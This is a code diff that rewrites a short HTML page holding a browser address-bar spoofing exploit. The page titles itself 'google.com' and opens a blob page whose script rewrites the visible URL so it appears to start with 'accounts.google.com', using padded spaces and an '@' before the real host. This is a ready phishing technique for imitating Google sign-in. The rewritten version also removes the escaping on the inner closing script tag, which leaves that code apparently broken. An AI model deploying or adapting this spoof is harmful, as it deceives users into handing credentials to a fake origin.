@@ -1,6 +1,18 @@
-<script>
-document.title = "google.com";  // Set the title to "google.com"
+<!DOCTYPE html>
+<html>
+<head>
+    <title></title> <!-- Empty title initially -->
+</head>
+<body>
+    <script>
+        // Set the title of the page to "google.com"
+        document.title = "google.com"; 
 
-var exp = 'FAKE GOOGLE<script>history.replaceState("","","blob:'+location.protocol+'//accounts.google.com'+Array(1000).join(' ')+'@'+location.host+'/")<\/script>';
-location=URL.createObjectURL(new Blob([exp], {type: "text/html"}));
-</script>
+        // The script for generating the fake page content
+        var exp = 'FAKE GOOGLE<script>history.replaceState("","","blob:'+location.protocol+'//accounts.google.com'+Array(1000).join(' ')+'@'+location.host+'/")</script>';
+        
+        // Create a new Blob with the fake content and change the location to it
+        location = URL.createObjectURL(new Blob([exp], { type: "text/html" }));
+    </script>
+</body>
+</html>
